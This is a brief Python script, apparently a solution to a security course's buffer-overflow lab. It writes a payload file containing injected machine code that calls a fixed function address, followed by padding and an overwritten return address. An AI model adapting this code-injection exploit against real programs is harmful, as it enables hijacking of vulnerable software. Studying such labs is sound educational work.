code = b"\xbf\x72\x00\x00\x00\x48\xc7\xc0\x16\x12\x40\x00\xff\xd0"
padding = b"A"*26
xs_addr = b"\x34\x13\x40\x00\x00\x00\x00\x00"
payload = code + padding + xs_addr
with open("ans3.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans3.txt")